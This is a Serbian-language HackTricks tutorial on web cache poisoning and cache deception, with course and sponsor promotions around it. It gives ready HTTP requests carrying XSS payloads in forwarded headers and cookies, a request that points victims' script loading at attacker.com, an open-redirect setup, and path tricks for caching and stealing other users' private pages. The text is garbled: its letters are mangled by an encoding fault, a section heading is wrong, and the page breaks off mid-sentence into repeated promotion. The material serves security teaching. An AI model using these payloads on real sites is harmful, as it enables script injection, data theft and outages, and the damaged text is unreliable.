# Trovanje ke코a i obmana ke코a

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
Danas dobijte pristup:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Razlika

> **Koja je razlika izme캠u trovanja ke코a veb stranica i obmane ke코a veb stranica?**
>
> * U **trovanju ke코a veb stranica**, napada캜 uzrokuje da aplikacija sa캜uva zlonamerni sadr쬬j u ke코u, a taj sadr쬬j se servira iz ke코a drugim korisnicima aplikacije.
> * U **obmani ke코a veb stranica**, napada캜 uzrokuje da aplikacija sa캜uva osetljiv sadr쬬j koji pripada drugom korisniku u ke코u, a zatim napada캜 preuzima taj sadr쬬j iz ke코a.

## Trovanje ke코a

Trovanje ke코a ima za cilj manipulaciju ke코em na strani klijenta kako bi se prisilili klijenti da u캜itaju resurse koji su neo캜ekivani, delimi캜ni ili pod kontrolom napada캜a. Obim uticaja zavisi od popularnosti pogo캠ene stranice, jer zaga캠eni odgovor se servira isklju캜ivo korisnicima koji pose캖uju stranicu tokom perioda kontaminacije ke코a.

Izvr코enje napada trovanja ke코a uklju캜uje nekoliko koraka:

1. **Identifikacija neindeksiranih ulaza**: To su parametri koji, iako nisu potrebni za ke코iranje zahteva, mogu promeniti odgovor koji server vra캖a. Identifikacija ovih ulaza je klju캜na jer se mogu iskoristiti za manipulaciju ke코om.

2. **Iskori코캖avanje neindeksiranih ulaza**: Nakon identifikacije neindeksiranih ulaza, slede캖i korak je saznati kako iskoristiti ove parametre da se izmeni odgovor servera na na캜in koji koristi napada캜u.

3. **Osiguravanje da je zaga캠eni odgovor ke코iran**: Poslednji korak je osigurati da je manipulisani odgovor sme코ten u ke코u. Na taj na캜in, svaki korisnik koji pristupa pogo캠enoj stranici dok je ke코 zaga캠en 캖e dobiti zaga캠eni odgovor.

### Otkrivanje: Provera HTTP zaglavlja

Obi캜no, kada je odgovor **sa캜uvan u ke코u**, postoji **zaglavlje koje to pokazuje**, mo쬰te proveriti na koja zaglavlja treba obratiti pa쬹ju u ovom postu: [**HTTP zaglavlja ke코a**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Otkrivanje: Ke코iranje koda 400

Ako mislite da se odgovor 캜uva u ke코u, mo쬰te poku코ati **slati zahteve sa lo코im zaglavljem**, na koje bi trebalo odgovoriti sa **status kodom 400**. Zatim poku코ajte pristupiti zahtevu na uobi캜ajen na캜in i ako je **odgovor status kod 400**, znate da je ranjiv (i 캜ak mo쬰te izvesti DoS napad).\
Lo코e konfigurisano zaglavlje mo쬰 biti samo `\:` kao zaglavlje.\
Napomena da se ponekad ovi status kodovi ne ke코iraju, pa 캖e ovaj test biti beskoristan.

### Otkrivanje: Identifikacija i procena neindeksiranih ulaza

Mo쬰te koristiti [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) da **brute-force parametre i zaglavlja** koja mogu **promeniti odgovor stranice**. Na primer, stranica mo쬰 koristiti zaglavlje `X-Forwarded-For` da bi pokazala klijentu da u캜ita skriptu odande:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Izazovite 코tetan odgovor sa serverske strane

Sa identifikovanim parametrom/headerom, proverite kako se on **sanitizuje** i **gde** se **reflektuje** ili uti캜e na odgovor iz headera. Mo쬰te li ga zloupotrebiti na bilo koji na캜in (izvr코iti XSS ili u캜itati JS kod koji kontroli코ete? izvr코iti DoS?...)

### Dohvatite ke코irani odgovor

Kada ste **identifikovali** **stranicu** koja mo쬰 biti zloupotrebljena, koji **parametar**/**header** koristiti i **kako** ga zloupotrebiti, trebate dobiti ke코iranu stranicu. Zavisno od resursa koji poku코avate dobiti u ke코u, to mo쬰 potrajati neko vreme, mo쬯a 캖ete morati poku코avati nekoliko sekundi.\
Header **`X-Cache`** u odgovoru mo쬰 biti vrlo koristan jer mo쬰 imati vrednost **`miss`** kada zahtev nije ke코iran i vrednost **`hit`** kada je ke코iran.\
Header **`Cache-Control`** je tako캠e interesantan jer mo쬰 otkriti da li se resurs ke코ira i kada 캖e slede캖i put resurs biti ponovo ke코iran: `Cache-Control: public, max-age=1800`\
Jo코 jedan interesantan header je **`Vary`**. Ovaj header se 캜esto koristi da **ukazuje na dodatne headere** koji se tretiraju kao **deo klju캜a ke코a**, 캜ak i ako obi캜no nemaju klju캜. Dakle, ako korisnik zna `User-Agent` rtve koju cilja, mo쬰 otrovati ke코 za korisnike koji koriste taj odre캠eni `User-Agent`.\
Jo코 jedan header koji se odnosi na ke코 je **`Age`**. Defini코e vreme u sekundama koliko je objekat bio u ke코u proxy servera.

Prilikom ke코iranja zahteva, **budite pa쬷jivi sa headerima koje koristite**, jer neki od njih mogu biti **neo캜ekivano kori코캖eni** kao **klju캜evi**, i rtva 캖e morati koristiti isti header. Uvek **testirajte** otrovavanje ke코a sa **razli캜itim pregleda캜ima** da biste proverili da li radi.

## Primeri iskori코캖avanja

### Najjednostavniji primer

Header poput `X-Forwarded-For` se reflektuje u odgovoru bez sanitizacije.\
Mo쬰te poslati osnovni XSS payload i otrovati ke코 tako da 캖e svako ko pristupi stranici biti izlo쬰n XSS napadu:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Napomena da 캖e se ovim otrovati zahtev za `/en?region=uk`, a ne za `/en`_

### Kori코캖enje otrovanja ke코a veba za iskori코캖avanje ranjivosti u rukovanju kola캜i캖ima

Kola캜i캖i tako캠e mogu biti reflektovani u odgovoru stranice. Ako to mo쬰te zloupotrebiti da izazovete XSS, na primer, mo쬰te iskoristiti XSS u nekoliko klijenata koji u캜itavaju zlonamerni ke코 odgovor.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Napomena da 캖e, ako je ranjivi kola캜i캖 veoma kori코캖en od strane korisnika, redovni zahtevi 캜istiti ke코.

### Kori코캖enje vi코e zaglavlja za iskori코캖avanje ranjivosti trovanja ke코a veb stranica <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Ponekad 캖e vam biti potrebno **iskoristiti nekoliko neindeksiranih unosa** kako biste mogli zloupotrebiti ke코. Na primer, mo쬰te prona캖i **Otvoreno preusmeravanje** ako postavite `X-Forwarded-Host` na domen koji kontroli코ete i `X-Forwarded-Scheme` na `http`. **Ako** je **server** **preusmeravao** sve **HTTP** zahteve **na HTTPS** i koristi zaglavlje `X-Forwarded-Scheme` kao ime domena za preusmeravanje. Mo쬰te kontrolisati gde je stranica usmerena preusmeravanjem.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Iskori코캖avanje sa ograni캜enim `Vary` zaglavljem

Ako ste otkrili da se zaglavlje **`X-Host`** koristi kao **ime domena za u캜itavanje JS resursa**, ali **`Vary`** zaglavlje u odgovoru ukazuje na **`User-Agent`**, tada morate prona캖i na캜in da izvu캜ete User-Agent rtve i otrovate ke코 koriste캖i taj korisni캜ki agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Iskori코캖avanje HTTP Cache Trovanja zloupotrebom HTTP Request Smuggling-a

Saznajte ovde kako izvesti [napade Cache Trovanja zloupotrebom HTTP Request Smuggling-a](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automatizovano testiranje za Web Cache Trovanje

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) mo쬰 se koristiti za automatsko testiranje web cache trovanja. Podr쬬va mnoge razli캜ite tehnike i visoko je prilagodljiv.

Primer kori코캖enja: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Ranjivi primeri

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS je prosle캠ivao fragment unutar URL-a bez uklanjanja i generisao klju캜 ke코a koriste캖i samo host, putanju i upit (ignori코u캖i fragment). Tako je zahtev `/#/../?r=javascript:alert(1)` poslat na backend kao `/#/../?r=javascript:alert(1)` i klju캜 ke코a nije imao payload unutra, samo host, putanju i upit.

### GitHub CP-DoS

Slanje neispravne vrednosti u zaglavlju content-type izazvalo je ke코iran odgovor 405. Klju캜 ke코a je sadr쬬o kola캜i캖, pa je bilo mogu캖e napadati samo neautorizovane korisnike.

### GitLab + GCP CP-DoS

GitLab koristi GCP kofere za skladi코tenje stati캜kog sadr쬬ja. **GCP kofe** podr쬬va **zaglavlje `x-http-method-override`**. Tako je bilo mogu캖e poslati zaglavlje `x-http-method-override: HEAD` i otrovati ke코 tako da vrati prazno telo odgovora. Tako캠e je mogao podr쬬vati metodu `PURGE`.

### Rack Middleware (Ruby on Rails)

U Ruby on Rails aplikacijama 캜esto se koristi Rack middleware. Svrha Rack koda je da uzme vrednost zaglavlja **`x-forwarded-scheme`** i postavi je kao 코emu zahteva. Kada se po코alje zaglavlje `x-forwarded-scheme: http`, dolazi do preusmeravanja 301 na istu lokaciju, 코to mo쬰 dovesti do DoS napada na tu resurs. Tako캠e, aplikacija mo쬰 prihvatiti zaglavlje `X-forwarded-host` i preusmeriti korisnike na odre캠eni host. Ovo pona코anje mo쬰 dovesti do u캜itavanja JavaScript fajlova sa servera napada캜a, 코to predstavlja sigurnosni rizik.

### 403 i Storage Kofe

Cloudflare je ranije ke코irao 403 odgovore. Poku코aj pristupa S3 ili Azure Storage Blobs sa neispravnim Authorization zaglavljima rezultovao bi 403 odgovorom koji je bio ke코iran. Iako je Cloudflare prestao da ke코ira 403 odgovore, ovo pona코anje mo쬰 biti prisutno u drugim proxy uslugama.

### Ubacivanje klju캜nih parametara

Ke코 캜esto uklju캜uje odre캠ene GET parametre u klju캜 ke코a. Na primer, Fastly-jev Varnish je ke코irao parametar `size` u zahtevima. Me캠utim, ako je URL-kodirana verzija parametra (npr. `siz%65`) tako캠e poslata sa pogre코nom vredno코캖u, klju캜 ke코a bi bio konstruisan koriste캖i ispravan parametar `size`. Me캠utim, backend bi obradio vrednost u URL-kodiranom parametru. URL-kodiranje drugog parametra `size` dovelo je do njegovog izostavljanja iz ke코a, ali njegove upotrebe od strane backend-a. Dodeljivanje vrednosti 0 ovom parametru rezultiralo je ke코iranim 400 Bad Request gre코kom.

### Pravila za korisni캜ki agent

Neki programeri blokiraju zahteve sa korisni캜kim agentima koji se podudaraju sa onima visoko prometnih alata poput FFUF ili Nuclei kako bi upravljali optere캖enjem servera. Ironi캜no, ovaj pristup mo쬰 dovesti do ranjivosti poput trovanja ke코a i DoS napada.

### Neispravna zaglavlja

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) defini코e prihvatljive karaktere u nazivima zaglavlja. Zaglavlja koja sadr쬰 karaktere van navedenog opsega **tchar** idealno bi trebala izazvati odgovor 400 Bad Request. U praksi, serveri se ne uvek pridr쬬vaju ovog standarda. Zna캜ajan primer je Akamai, koji prosle캠uje zaglavlja sa neispravnim karakterima i ke코ira svaku 400 gre코ku, sve dok zaglavlje `cache-control` nije prisutno. Identifikovan je iskoristiv obrazac gde slanje zaglavlja sa neispravnim karakterom, poput `\`, rezultuje ke코iranom 400 Bad Request gre코kom.

### Pronala쬰nje novih zaglavlja

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Trovanje Ke코a

Cilj trovanja ke코a je da natera klijente da **u캜itavaju resurse koji 캖e biti sa캜uvani u ke코u sa njihovim osetljivim informacijama**.

Pre svega, treba napomenuti da se **ekstenzije** poput `.css`, `.js`, `.png` obi캜no **konfiguri코u** da se **sa캜uvaju** u **ke코u**. Dakle, ako pristupite `www.example.com/profile.php/nonexistent.js`, ke코 캖e verovatno sa캜uvati odgovor jer vidi **ekstenziju** `.js`. Ali, ako **aplikacija** ponavlja sa **osetljivim** sadr쬬jem korisnika koji je sa캜uvan u _www.example.com/profile.php_, mo쬰te **ukrasti** taj sadr쬬j od drugih korisnika.

Drugi testovi koje treba izvr코iti:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Koristite manje poznate ekstenzije poput_ `.avif`

Jo코 jedan vrlo jasan primer mo쬰 se na캖i u ovom write-up-u: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
U primeru je obja코njeno da ako u캜itate nepostoje캖u stranicu poput _http://www.example.com/home.php/non-existent.css_, sadr쬬j
<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
